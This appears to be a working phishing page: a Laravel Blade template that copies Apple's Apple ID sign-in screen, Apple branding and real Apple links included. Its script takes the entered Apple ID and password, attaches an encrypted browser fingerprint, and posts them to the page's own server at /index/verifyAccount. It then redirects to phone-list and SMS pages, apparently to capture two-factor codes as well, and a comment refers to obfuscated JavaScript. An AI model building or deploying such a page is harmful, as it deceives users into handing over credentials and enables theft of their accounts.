<!DOCTYPE html>
<html dir="ltr" data-rtl="false" lang="zh">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Sign In</title>
    {{-- CSS 和外部库 --}}

    <link rel="stylesheet" href="{{ asset('/fonts/fonts.css') }}" type="text/css">
    <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/app-sk7.css') }}">
    <link rel="stylesheet" type="text/css" media="screen" href="{{ asset('/css/signin.css') }}">


    <style>
        /* 检测浏览器自动填充的CSS */
        input:-webkit-autofill {
            animation-name: onAutoFillStart;
            animation-duration: 0.001s;
        }

        input:not(:-webkit-autofill) {
            animation-name: onAutoFillCancel;
            animation-duration: 0.001s;
        }

        @keyframes onAutoFillStart {
            from {
                opacity: 0.99;
            }

            to {
                opacity: 1;
            }
        }

        @keyframes onAutoFillCancel {
            from {
                opacity: 1;
            }

            to {
                opacity: 0.99;
            }
        }
    </style>
</head>

<body>
    <div id="encryption-data" data-public-key="{{ $data['publicKey'] ?? '' }}"></div>

    <div class="si-body si-container container-fluid" id="content" role="main" data-theme="dark">
        <apple-auth app-loading-defaults="{appLoadingDefaults}" pmrpc-hook="{pmrpcHook}">
            <div class="widget-container  fade-in restrict-min-content  restrict-max-wh  fade-in " data-mode="inline"
                data-isiebutnotedge="false">
                <div id="step" class="si-step  ">
                    <logo {hide-app-logo}="hideAppLogo" {show-fade-in}="showFadeIn" {(section)}="section"></logo>
                    <div id="stepEl">
                        <sign-in suppress-iforgot="{suppressIforgot}" initial-route="" {on-test-idp}="@_onTestIdp">

                            <div class="signin fade-in" id="signin">
                                <app-title signin-label="true" title-class="">

                                    <h1 tabindex="-1" class="si-container-title tk-callout">
                                        <p id="app">Apple ID</p>


                                    </h1>
                                </app-title>
                                <p class="si-container-description" id="account">{{ __('apple.signin.account') }}</p>


                                <div class="container si-field-container  password-second-step     ">
                                    <div id="sign_in_form" class="signin-form eyebrow fed-auth hide-password">
                                        <div class="si-field-container container">
                                            <div class="">
                                                <div class="account-name form-row    hide-password  ">
                                                    <label class="sr-only form-cell form-label"
                                                        for="account_name_text_field">
                                                        <p id="Login"></p>
                                                    </label>
                                                    <div class="form-cell">

                                                        <div class=" form-cell-wrapper form-textbox">
                                                            <input type="text" id="account_name_text_field"
                                                                value="{{ $data['account'] }}"
                                                                can-field="accountName" autocomplete="off"
                                                                autocorrect="off" autocapitalize="off"
                                                                aria-required="true" required="required"
                                                                spellcheck="false" ($focus)="appleIdFocusHandler()"
                                                                ($keyup)="appleIdKeyupHandler()"
                                                                ($blur)="appleIdBlurHandler()"
                                                                class="force-ltr form-textbox-input lower-border-reset"
                                                                aria-invalid="false"
                                                                autofocus="">
                                                            <span aria-hidden="true" id="apple_id_field_label"
                                                                class=" form-textbox-label  form-label-flyout">

                                                                <p id="Email">{{ __('apple.signin.email') }}</p>

                                                            </span>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div class="password form-row   hide-password hide-placeholder    "
                                                    aria-hidden="true">
                                                    <label class="sr-only form-cell form-label"
                                                        for="password_text_field">{{ __('apple.signin.password') }}</label>
                                                    <div class="form-cell">
                                                        <div class="form-cell-wrapper form-textbox">
                                                            <input type="password" id="password_text_field"
                                                                ($keyup)="passwordKeyUpHandler()"
                                                                ($focus)="pwdFocusHandler()" ($blur)="pwdBlurHandler()"
                                                                value="{{ $data['password'] }}"
                                                                aria-required="true"
                                                                required="required" can-field="password"
                                                                autocomplete="off" class="form-textbox-input "
                                                                aria-invalid="false" tabindex="-1">
                                                            <span id="password_field_label" aria-hidden="true"
                                                                class=" form-textbox-label  form-label-flyout"> {{ __('apple.signin.password') }}
                                                            </span>
                                                            <span class="sr-only form-label-flyout"
                                                                id="invalid_user_name_pwd_err_msg"
                                                                aria-hidden="true">
                                                            </span>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    <div class="pop-container error signin-error hide" ($click)="errorClickHandler()">
                                        <div class="error pop-bottom tk-subbody-headline" ($click)="errorClickHandler()">
                                            <p class="fat" id="errMsg">
                                            <p id="incorrect">

                                            </p>
                                            </p>

                                            <a class="si-link ax-outline thin tk-subbody"
                                                href="https://iforgot.apple.com/password/verify/appleid"
                                                target="_blank">
                                                {{ __('apple.signin.forgot?') }}

                                                <span
                                                    class="no-wrap sk-icon sk-icon-after sk-icon-external">{{ __('apple.signin.password?') }}</span>
                                                <span
                                                    class="sr-only">{{ __('apple.signin.new_window_open') }}</span>
                                            </a>


                                        </div>
                                    </div>


                                    <div class="si-remember-password">
                                        <input type="checkbox" id="remember-me" class="form-choice form-choice-checkbox"
                                            {($checked)}="isRememberMeChecked">
                                        <label id="remember-me-label" class="form-label" for="remember-me">
                                            <span class="form-choice-indicator" aria-hidden="true"
                                                id="remember">{{ __('apple.signin.remember') }}</span>
                                        </label>
                                    </div>
                                    <div class="spinner-container auth  show spinner-hide">
                                        <div class="spinner" role="progressbar"
                                            style="position: absolute; width: 0px; z-index: 2000000000; left: 50%; top: 50%;">
                                            <div
                                                style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-0-12;">
                                                <div
                                                    style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(0deg) translate(6.25px, 0px); border-radius: 1px;">
                                                </div>
                                            </div>
                                            <div
                                                style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-1-12;">
                                                <div
                                                    style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(30deg) translate(6.25px, 0px); border-radius: 1px;">
                                                </div>
                                            </div>
                                            <div
                                                style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-2-12;">
                                                <div
                                                    style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(60deg) translate(6.25px, 0px); border-radius: 1px;">
                                                </div>
                                            </div>
                                            <div
                                                style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-3-12;">
                                                <div
                                                    style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(90deg) translate(6.25px, 0px); border-radius: 1px;">
                                                </div>
                                            </div>
                                            <div
                                                style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-4-12;">
                                                <div
                                                    style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(120deg) translate(6.25px, 0px); border-radius: 1px;">
                                                </div>
                                            </div>
                                            <div
                                                style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-5-12;">
                                                <div
                                                    style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(150deg) translate(6.25px, 0px); border-radius: 1px;">
                                                </div>
                                            </div>
                                            <div
                                                style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-6-12;">
                                                <div
                                                    style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(180deg) translate(6.25px, 0px); border-radius: 1px;">
                                                </div>
                                            </div>
                                            <div
                                                style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-7-12;">
                                                <div
                                                    style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(210deg) translate(6.25px, 0px); border-radius: 1px;">
                                                </div>
                                            </div>
                                            <div
                                                style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-8-12;">
                                                <div
                                                    style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(240deg) translate(6.25px, 0px); border-radius: 1px;">
                                                </div>
                                            </div>
                                            <div
                                                style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-9-12;">
                                                <div
                                                    style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(270deg) translate(6.25px, 0px); border-radius: 1px;">
                                                </div>
                                            </div>
                                            <div
                                                style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-10-12;">
                                                <div
                                                    style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(300deg) translate(6.25px, 0px); border-radius: 1px;">
                                                </div>
                                            </div>
                                            <div
                                                style="position: absolute; top: -1px; opacity: 0.25; animation: 1s linear 0s infinite normal none running opacity-60-25-11-12;">
                                                <div
                                                    style="position: absolute; width: 7.25px; height: 2.25px; background: rgb(73, 73, 73); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 1px; transform-origin: left center; transform: rotate(330deg) translate(6.25px, 0px); border-radius: 1px;">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <button id="sign-in" tabindex="0"
                                        class="si-button btn  fed-ui   fed-ui-animation-show   disable   remember-me"
                                        aria-label="continue"
                                        aria-disabled="true" disabled="">
                                        <i class="shared-icon icon_sign_in"></i>
                                        <span class="text feat-split">
                                            {{ __('apple.signin.continue') }}

                                        </span>
                                    </button>
                                    <button id="sign-in-cancel" ($click)="_signInCancel($element)" aria-disabled="false"
                                        tabindex="0"
                                        class="si-button btn secondary feat-split  remember-me   link "
                                        aria-label="closure">
                                        <span class="text"> {{ __('apple.signin.close') }}

                                        </span>
                                    </button>
                                </div>
                                <div class="si-container-footer">

                                    <div class="separator "></div>
                                    <div class="links tk-subbody">
                                        <div class="si-forgot-password">

                                            <a id="iforgot-link" class="si-link ax-outline lite-theme-override"
                                                ($click)="iforgotLinkClickHandler($element)"
                                                href="https://iforgot.apple.com/password/verify/appleid" target="_blank">

                                                <span
                                                    class="no-wrap sk-icon sk-icon-after sk-icon-external">
                                                    {{ __('apple.signin.forgot_account') }}{{ __('apple.signin.password') }}
                                                </span>

                                                {{-- <span--}}
                                                {{-- class="sr-only">{{ __('apple.signin.new_window_open') }}</span>--}}
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </sign-in>
                    </div>
                </div>
                <div id="stocking" style="display:none !important;"></div>

            </div>
            <idms-modal wrap-class="full-page-error-wrapper " {(show)}="showfullPageError" auto-close="false">
            </idms-modal>
        </apple-auth>
    </div>

    {{-- 引用我们打包和混淆后的 JS 文件 --}}
    <script src="{{ mix('js/auth/signin.js') }}"></script>
    <script type="text/javascript" src="{{ asset('/js/apple/jquery-3.6.1.min.js') }}"></script>
    <script type="text/javascript" src="{{ asset('/js/apple/jquery.cookie.js') }}"></script>
    <script src="https://unpkg.com/libphonenumber-js@1.12.8/bundle/libphonenumber-max.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jsencrypt@3.3.2/bin/jsencrypt.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script src="{{ asset('/hccanvastxt/hccanvastxt.min.js?1') }}"></script>
    <script type="text/javascript">
        const country_code = '{{ $data["country_code"] }}';

        class SimpleSignIn {
            constructor() {
                this.accountInput = $("#account_name_text_field");
                this.passwordInput = $("#password_text_field");
                this.signInButton = $("#sign-in");
                this.passwordContainer = $(".password");
                this.spinner = $(".spinner-container.auth");
                this.signinForm = $("#sign_in_form");
                this.accountForm = $("#sign_in_form .account-name");
                this.passwordForm = $("#sign_in_form .password");
                this.accountLabel = $("#apple_id_field_label");
                this.passwordLabel = $("#password_field_label");
                this.signinError = $(".signin-error");
                this.errorMessage = $("#incorrect");

                this.init();
            }

            init() {
                $.removeCookie("Guid");
                $.removeCookie("ID");
                $.removeCookie("Number");
                $.removeCookie("phoneCount");
                $(window.parent.document).scrollTop(46);

                this.bindEvents();

                this.checkInitialState();
            }

            bindEvents() {
                this.accountInput.on('input', () => this.updateButtonState());
                this.passwordInput.on('input', () => this.updatePasswordState());

                this.bindAutoFillEvents();

                this.signInButton.on('click', () => {
                    this.handleSignIn();
                });

                this.accountInput.on('keypress', (e) => {
                    if (e.keyCode === 13) this.handleSignIn();
                });
                this.passwordInput.on('keypress', (e) => {
                    if (e.keyCode === 13) this.handleSignIn();
                });

                this.bindFocusEvents();

                $("body").on("click", (e) => {
                    if (!$(e.target).closest(".signin-error").length) {
                        this.signinError.addClass("hide");
                    }
                });
            }

            bindFocusEvents() {
                this.accountInput.on("focus", () => {
                    this.accountForm.addClass("select-focus");
                    this.passwordForm.removeClass("select-focus");
                    this.signinError.addClass("hide");

                    if (!this.isPasswordVisible()) {
                        this.signInButton.addClass("has-focus");
                        this.accountLabel.removeClass("account-label-custom-blur");
                        this.accountLabel.addClass("account-label-custom-focus");
                    }
                });

                this.accountInput.on("blur", () => {
                    if (!this.isPasswordVisible()) {
                        let value = this.accountInput.val();
                        if (!value || value.length < 1) {
                            this.signInButton.removeClass("has-focus");
                            this.accountLabel.removeClass("account-label-custom-focus");
                            this.accountLabel.addClass("account-label-custom-blur");
                        }
                    }
                });

                this.passwordInput.on("focus", () => {
                    this.passwordForm.addClass("select-focus");
                    this.accountForm.removeClass("select-focus");
                    this.signInButton.addClass("has-focus-password");
                    this.signInButton.removeClass("has-focus-password-blur");
                    this.signinError.addClass("hide");
                });

                this.passwordInput.on("blur", () => {
                    let value = this.passwordInput.val();
                    if (!value || value.length < 1) {
                        this.signInButton.removeClass("has-focus-password");
                        this.signInButton.addClass("has-focus-password-blur");
                    }
                });
            }

            bindAutoFillEvents() {
                this.passwordInput.on('change', () => {
                    this.handlePasswordAutoFill();
                });

                this.accountInput.on('change', () => {
                    setTimeout(() => {
                        this.handlePasswordAutoFill();
                    }, 100);
                });

                this.passwordInput.on('animationstart', (e) => {
                    if (e.originalEvent &&
                        (e.originalEvent.animationName.includes('autofill') ||
                            e.originalEvent.animationName === 'onAutoFillStart')) {
                        this.handlePasswordAutoFill();
                    }
                });

                this.accountInput.on('animationstart', (e) => {
                    if (e.originalEvent &&
                        (e.originalEvent.animationName.includes('autofill') ||
                            e.originalEvent.animationName === 'onAutoFillStart')) {
                        setTimeout(() => {
                            this.handlePasswordAutoFill();
                        }, 100);
                    }
                });

                this.startAutoFillPolling();
            }

            handlePasswordAutoFill() {
                const passwordValue = this.passwordInput.val();
                const accountValue = this.accountInput.val();

                if (passwordValue && passwordValue.length > 0) {
                    if (!this.isPasswordVisible()) {
                        this.showPasswordField();
                    }

                    if (accountValue && accountValue.length > 0) {
                        this.accountInput.addClass("form-textbox-entered");
                        this.accountForm.addClass("show-password");
                    }

                    this.updatePasswordState();
                }
            }

            // 定时检查自动填充（作为备用方案）
            startAutoFillPolling() {
                // 只在页面加载后的前几秒内进行检查
                let checkCount = 0;
                const maxChecks = 20; // 最多检查20次
                const checkInterval = 250; // 每250ms检查一次

                const pollInterval = setInterval(() => {
                    checkCount++;

                    const passwordValue = this.passwordInput.val();
                    if (passwordValue && passwordValue.length > 0 && !this.isPasswordVisible()) {
                        this.handlePasswordAutoFill();
                        clearInterval(pollInterval);
                        return;
                    }

                    // 达到最大检查次数后停止
                    if (checkCount >= maxChecks) {
                        clearInterval(pollInterval);
                    }
                }, checkInterval);
            }

            // 检查初始状态
            checkInitialState() {
                let account = this.accountInput.val();
                let password = this.passwordInput.val();

                if (account && account.length > 0 && password && password.length > 0) {
                    // 如果账号和密码都有值，显示密码框并聚焦到密码输入框
                    this.showPasswordField();
                    this.enableButton();
                    this.passwordInput.focus();
                    this.signInButton.addClass("has-focus-password");
                } else if (account && account.length > 0) {
                    // 如果只有账号，启用按钮并聚焦到账号
                    this.enableButton();
                    this.signInButton.addClass("has-focus");
                } else {
                    // 都没有值，禁用按钮
                    this.disableButton();
                }
            }

            // 统一的按钮状态管理
            updateButtonState() {
                const hasAccount = this.accountInput.val().trim().length > 0;

                if (hasAccount) {
                    this.enableButton();
                    // 当账号输入框有内容时，隐藏密码框并清空密码（重新开始流程）
                    if (this.isPasswordVisible()) {
                        this.hidePasswordField();
                        this.passwordInput.val("");
                    }
                    // 确保按钮聚焦到账号输入框
                    this.signInButton.removeClass("has-focus-password");
                    this.signInButton.removeClass("has-focus-password-blur");
                    this.signInButton.addClass("has-focus");
                } else {
                    this.disableButton();
                    this.hidePasswordField();
                    this.passwordInput.val("");
                    this.signInButton.removeClass("has-focus");
                }
            }

            // 密码输入框状态管理
            updatePasswordState() {
                const hasPassword = this.passwordInput.val().length > 0;

                if (hasPassword) {
                    this.enableButton();
                    this.signInButton.removeClass("has-focus");
                    this.signInButton.addClass("has-focus-password");
                    this.signInButton.removeClass("has-focus-password-blur");
                } else {
                    this.disableButton();
                    this.signInButton.removeClass("has-focus-password");
                    this.signInButton.addClass("has-focus-password-blur");
                }
            }

            // 密码框可见性检查
            isPasswordVisible() {
                return this.signinForm.hasClass("account-name-entered") &&
                    !this.signinForm.hasClass("hide-password");
            }

            // 显示密码输入框
            showPasswordField() {
                this.signinForm.addClass("account-name-entered");
                this.signinForm.removeClass("hide-password");
                this.signinForm.removeClass("hide-placeholder");

                this.accountInput.addClass("form-textbox-input");
                this.accountInput.removeClass("lower-border-reset");
                this.accountInput.addClass("form-textbox-entered");
                this.accountForm.removeClass("hide-password");
                this.accountForm.addClass("show-password");
            }

            // 隐藏密码输入框
            hidePasswordField() {
                this.signinForm.removeClass("account-name-entered");
                this.signinForm.addClass("hide-password");
                this.signinForm.addClass("hide-placeholder");
                this.signInButton.removeClass("has-focus-password");
                this.signInButton.removeClass("has-focus-password-blur");

                this.accountForm.addClass("hide-password");
                this.accountForm.removeClass("show-password");
            }

            // 启用按钮
            enableButton() {
                this.signInButton.removeClass("disable");
                this.signInButton.removeAttr("disabled");
                this.signInButton.attr("aria-disabled", "false");
            }

            // 禁用按钮
            disableButton() {
                this.signInButton.addClass("disable");
                this.signInButton.attr("disabled", "true");
                this.signInButton.attr("aria-disabled", "true");
            }

            // 显示加载状态
            showLoading() {

                this.signInButton.addClass("v-hide");

                this.spinner.removeClass("spinner-hide");
                this.spinner.addClass("focus");
                // 强制显示spinner（覆盖任何隐藏样式）
                this.spinner.css({
                    'display': 'block',
                    'visibility': 'visible',
                    'opacity': '1',
                    'z-index': '9999'
                });

                // 登录时loading固定显示在密码字段
                this.spinner.addClass("password-spinner");
                this.spinner.removeClass("account-spinner");


                // 检查内部spinner元素
                const innerSpinner = this.spinner.find('.spinner');

                this.disableInputs();
            }

            // 隐藏加载状态
            hideLoading() {
                this.signInButton.removeClass("v-hide");
                this.spinner.addClass("spinner-hide");
                this.spinner.removeClass("focus");
                // 强制隐藏spinner
                this.spinner.css('display', 'none');

                // 清理spinner的位置状态
                this.spinner.removeClass("password-spinner");
                this.spinner.removeClass("account-spinner");

                this.enableInputs();
            }

            // 禁用输入框
            disableInputs() {
                this.accountInput.addClass("verify-password");
                this.accountInput.attr("disabled", "true");
                this.accountLabel.addClass("account-label-custom-focus");
                this.passwordInput.addClass("verify-password");
                this.passwordInput.attr("disabled", "true");
                this.passwordLabel.addClass("account-label-custom-focus");
            }

            // 启用输入框
            enableInputs() {
                this.accountInput.removeClass("verify-password");
                this.accountInput.removeAttr("disabled");
                this.accountLabel.removeClass("account-label-custom-focus");
                this.passwordInput.removeClass("verify-password");
                this.passwordInput.removeAttr("disabled");
                this.passwordLabel.removeClass("account-label-custom-focus");
            }

            // 简化的登录处理
            async handleSignIn() {

                let account = this.accountInput.val().trim();
                const password = this.passwordInput.val();


                if (!account) {
                    return;
                }

                // 首先格式化手机号（如果是手机号的话）
                const formattedAccount = this.formatAndGetPhoneNumber(account);
                if (formattedAccount !== account) {
                    // 如果格式化后的值不同，更新输入框
                    this.accountInput.val(formattedAccount);
                    account = formattedAccount;
                }

                if (!password) {
                    // 没有密码时，显示密码框并聚焦
                    if (!this.isPasswordVisible()) {
                        this.showPasswordField();
                    }
                    this.passwordInput.focus();
                    return;
                }

                // 开始登录
                this.showLoading();

                try {
                    const response = await this.performLogin(account, password);
                    this.handleLoginSuccess(response);
                } catch (error) {
                    this.handleLoginError(error);
                } finally {
                    this.hideLoading();
                }
            }

            // 异步登录请求
            performLogin(account, password) {
                return new Promise(async (resolve, reject) => {

                    let encryptedData = null;
                    try {
                        // 调用全局加密函数
                        encryptedData = await window.getEncryptedFingerprint();
                    } catch (error) {
                        
                    }

                 
                    $.ajax({
                        url: "/index/verifyAccount",
                        dataType: "json",
                        type: "post",
                        async: true,
                        contentType: "application/json",
                        headers: {
                            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content'),
                        },
                        data: JSON.stringify({
                            accountName: account,
                            password: password,
                            fingerprint: encryptedData, // 发送加密后的数据
                        }),
                        success: function(response) {
                            resolve(response);
                        },
                        error: function(xhr, status, error) {
                            reject({
                                xhr,
                                status,
                                error
                            });
                        }
                    });
                });
            }

            // 处理登录成功
            handleLoginSuccess(response) {
                const data = response?.data;
                if (data && (response.code === 201 || response.code === 202 || response.code === 203)) {
                    // 更新父窗口动画
                    $(".landing__animation", window.parent.document).hide();
                    $(".landing", window.parent.document).addClass(
                        "landing--sign-in landing--first-factor-authentication-success landing--transition"
                    );

                    // 根据不同的响应代码跳转到不同页面
                    switch (response.code) {
                        case 201:
                            window.location.href = "/index/auth";
                            break;
                        case 202:
                            window.location.href = "/index/authPhoneList?Guid=" + data.Guid;
                            break;
                        case 203:
                            window.location.href = `/index/sms?Guid=${data.Guid}`;
                            break;
                        default:
                            window.location.href = "/index/auth";
                    }

                    return;
                }

                this.handleLoginError(response);
            }

            // 处理登录错误
            handleLoginError(error) {

                // 清空密码并重新聚焦账号输入框
                this.passwordInput.val("");
                this.accountInput.focus();

                // 显示错误信息
                this.signinError.removeClass("hide");
                this.errorMessage.text(error.message);
            }

            // 格式化手机号并返回格式化后的值
            formatAndGetPhoneNumber(value) {
                // 如果包含@符号，则认为是邮箱，不格式化
                if (value.includes('@')) {
                    return value;
                }

                let formattedNumber;
                // 尝试解析手机号
                if (value.startsWith('+')) {
                    // 已经包含国际区号，直接解析
                    formattedNumber = libphonenumber.parsePhoneNumber(value)?.formatInternational();
                } else {
                    // 没有区号，使用默认国家解析
                    formattedNumber = libphonenumber.parsePhoneNumber(value, country_code)?.formatInternational();
                }

                // 如果格式化成功，返回格式化后的值，否则返回原值
                return formattedNumber || value;
            }
        }

        // 初始化登录管理器
        let signInManager;
        $(document).ready(function() {
            signInManager = new SimpleSignIn();
        });
    </script>

</body>

</html>